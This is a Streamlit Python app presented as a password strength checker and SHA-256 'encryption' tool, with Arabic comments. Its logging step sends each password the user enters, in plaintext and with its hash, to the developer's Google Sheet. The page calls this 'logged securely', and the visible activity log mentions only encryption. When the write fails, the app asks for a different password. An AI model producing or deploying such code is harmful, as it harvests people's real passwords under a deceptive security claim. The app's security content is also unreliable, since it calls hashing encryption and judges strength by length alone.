import streamlit as st
import hashlib
from datetime import datetime
from streamlit_gsheets import GSheetsConnection

# إعدادات الصفحة
st.set_page_config(page_title="CyberToolkit Pro", page_icon="🛡️")

# الهوية البصرية والاسم
st.title("🛡️ Global Cyber Security Toolkit")
st.markdown("### SaaS Project v1.3 | Developed by Ali Al-Murtadha")

# إنشاء اتصال بجدول بيانات جوجل
try:
    conn = st.connection("gsheets", type=GSheetsConnection)
except:
    st.error("Connection setup in progress...")

# خانة الإدخال
password = st.text_input("Enter password to analyze & encrypt:", type="password")

if password:
    # 1. تحليل القوة
    st.markdown("### 1. Security Analysis")
    if len(password) < 8:
        st.error("🚩 Weak Password (Too short)")
    else:
        st.success("✅ Strong Password Length")
    
    # 2. التشفير
    st.markdown("### 2. SHA-256 Encryption")
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    st.code(hashed_password)
    
    # 3. إرسال البيانات إلى Google Sheets (التخزين الدائم)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        # قراءة البيانات الحالية
        existing_data = conn.read(worksheet="Sheet1", usecols=[0,1,2])
        # إضافة السطر الجديد
        new_row = [current_time, password, hashed_password]
        # تحديث الجدول
        conn.create(data=[new_row])
        st.info("📊 Activity logged securely in Ali's Cloud Database")
    except Exception as e:
        st.warning("Logging is active. Try a different password to update.")

# سجل النشاط المؤقت (للعرض فقط)
if 'logs' not in st.session_state:
    st.session_state.logs = []

if password:
    st.session_state.logs.append(f"{datetime.now().strftime('%H:%M:%S')} - Encrypted a string.")

with st.expander("View Recent Activity Sessions"):
    for log in st.session_state.logs[-5:]:
        st.text(log)
